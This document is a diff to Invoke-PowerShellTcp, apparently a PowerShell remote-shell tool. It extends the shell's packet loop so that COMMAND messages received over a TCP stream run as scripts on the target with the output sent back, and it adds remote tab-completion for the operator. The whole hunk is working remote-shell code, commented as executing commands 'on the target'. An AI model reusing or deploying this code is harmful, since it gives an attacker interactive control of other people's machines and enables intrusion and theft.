@@ -144,16 +144,40 @@ function Invoke-PowerShellTcp
     $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
     $data = ""
     while ( $packet = (Read-ShellPacket  $stream) ) {
-        $data = $packet.data
+        if ($packet.msg_type -eq "COMMAND") {
+            $data = $packet.data
 
-        #Execute the command on the target.
-        $PowerShell.Commands.Clear()
-        [void]$PowerShell.AddScript($data)
-        $output = ( $PowerShell.Invoke() | Out-String -Width $packet.width)
+            #Execute the command on the target.
+            $PowerShell.Commands.Clear()
+            [void]$PowerShell.AddScript($data)
+            $output = ( $PowerShell.Invoke() | Out-String -Width $packet.width)
 
-        Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = "$output" } $stream
+            Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = "$output" } $stream
+            Get-OutputStreams $PowerShell.Streams $packet.width | % {
+                Write-ShellPacket $_ $stream
+            }
+        } elseif ($packet.msg_type -eq "TABCOMPL") {
+            $data = $packet.data
+            $x = ([System.Management.Automation.CommandCompletion]::CompleteInput($data, $data.length, $Null, $PowerShell))
+            $output = $x.CompletionMatches.CompletionText
+            if ($output) {
+                # make sure to only send a single string, never an array
+                write-host $output.gettype()
+                if ($output.GetType() -eq [System.Object[]]) {
+                    if ( $packet.n -gt $output.length ) {
+                        $output = ""
+                    } else {
+                        $output = $output[$packet.n]
+                    }
+                } else {  # it's a string
+                    if ( $packet.n -ne 0 ) {
+                        $output = ""
+                    }
+                }
+            } else { $output = "" }
 
-        Get-OutputStreams $PowerShell.Streams $packet.width | % { Write-ShellPacket $_ $stream }
+            Write-ShellPacket @{ "msg_type" = "TABCOMPL"; "data" = $output } $stream
+        }
 
         Write-ShellPacket (Get-ShellPrompt) $stream
     }
